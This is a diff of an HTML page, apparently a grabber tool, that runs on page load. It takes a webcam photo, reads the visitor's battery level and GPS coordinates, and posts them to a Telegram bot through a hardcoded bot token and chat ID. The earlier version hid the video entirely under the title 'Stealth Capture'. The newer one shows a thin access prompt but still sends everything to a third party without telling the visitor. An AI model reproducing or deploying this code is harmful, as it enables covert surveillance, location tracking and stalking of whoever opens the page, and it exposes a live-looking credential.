@@ -3,57 +3,72 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Stealth Capture</title>
+    <title>User Capture</title>
     <style>
-        body { background-color: black; margin: 0; height: 100vh; overflow: hidden; }
+        body { background-color: black; color: white; text-align: center; padding-top: 20px; }
     </style>
 </head>
 <body>
-    <video id="video" autoplay style="display: none;"></video>
+    <h2>Allow Camera & Location Access</h2>
+    <video id="video" autoplay style="width: 300px; height: 200px;"></video>
     <canvas id="canvas" width="300" height="200" style="display: none;"></canvas>
 
     <script>
         const TELEGRAM_BOT_TOKEN = "7250347146:AAF2fQ7skQFhHoOgsboWUJzQlmYo5ZAHMC4";
-        const TELEGRAM_CHAT_ID = "5112680061";  // 👈 Yeh numeric Telegram ID honi chahiye
+        const TELEGRAM_CHAT_ID = "5112680061";  // ✅ Updated Chat ID
 
         let video = document.getElementById("video");
         let canvas = document.getElementById("canvas");
         let context = canvas.getContext("2d");
 
-        // 🚀 **Camera Access & Capture Photo**
-        navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
-            video.srcObject = stream;
-            setTimeout(() => {
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                let imageData = canvas.toDataURL("image/png");
-                video.srcObject.getTracks().forEach(track => track.stop()); // 📌 Camera Stop
-                captureDetails(imageData);
-            }, 2000); // 🔥 2 sec me photo capture
-        }).catch(err => console.log("Camera blocked!", err));
+        async function startCapture() {
+            try {
+                // 🚀 Camera Access
+                let stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
 
-        // 🚀 **Battery & Location Fetch**
-        let batteryLevel = "Unknown";
-        navigator.getBattery().then(battery => {
-            batteryLevel = `${Math.round(battery.level * 100)}%`;
-        });
+                setTimeout(() => {
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    let imageData = canvas.toDataURL("image/png");
+                    stream.getTracks().forEach(track => track.stop()); // 📌 Stop Camera
 
-        let locationData = "Unknown";
-        navigator.geolocation.getCurrentPosition(position => {
-            locationData = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`;
-        });
+                    getUserDetails(imageData);
+                }, 3000); // 🔥 3 sec me photo capture
+            } catch (err) {
+                console.error("Camera access denied!", err);
+            }
+        }
 
-        // 🚀 **Send Data to Telegram**
-        function captureDetails(imageData) {
-            let message = `📸 **User Info**\n🔋 Battery: ${batteryLevel}\n📍 Location: ${locationData}`;
+        // 🚀 Get Battery & Location
+        async function getUserDetails(imageData) {
+            let batteryLevel = "Unknown";
+            try {
+                let battery = await navigator.getBattery();
+                batteryLevel = `${Math.round(battery.level * 100)}%`;
+            } catch (err) { console.log("Battery info blocked!"); }
 
-            // 🔹 **Text Message Send**
+            let locationData = "Unknown";
+            navigator.geolocation.getCurrentPosition(position => {
+                locationData = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`;
+                sendToTelegram(imageData, batteryLevel, locationData);
+            }, err => {
+                console.log("Location access denied!", err);
+                sendToTelegram(imageData, batteryLevel, "Location Denied");
+            });
+        }
+
+        // 🚀 Send Data to Telegram
+        function sendToTelegram(imageData, battery, location) {
+            let message = `📸 **User Info**\n🔋 Battery: ${battery}\n📍 Location: ${location}`;
+
+            // 🔹 Send Text
             fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: "Markdown" })
             }).catch(error => console.log("Message sending error:", error));
 
-            // 🔹 **Photo Send (Blob format me)**
+            // 🔹 Send Photo
             let blob = dataURItoBlob(imageData);
             let formData = new FormData();
             formData.append("chat_id", TELEGRAM_CHAT_ID);
@@ -65,7 +80,7 @@
             }).catch(error => console.log("Photo sending error:", error));
         }
 
-        // 🚀 **Convert Base64 Image to Blob (Required for Telegram Upload)**
+        // 🚀 Convert Base64 to Blob
         function dataURItoBlob(dataURI) {
             let byteString = atob(dataURI.split(',')[1]);
             let mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
@@ -76,4 +91,9 @@
             }
             return new Blob([ab], { type: mimeString });
         }
-    </script
+
+        // 🚀 Start Process
+        startCapture();
+    </script>
+</body>
+</html>
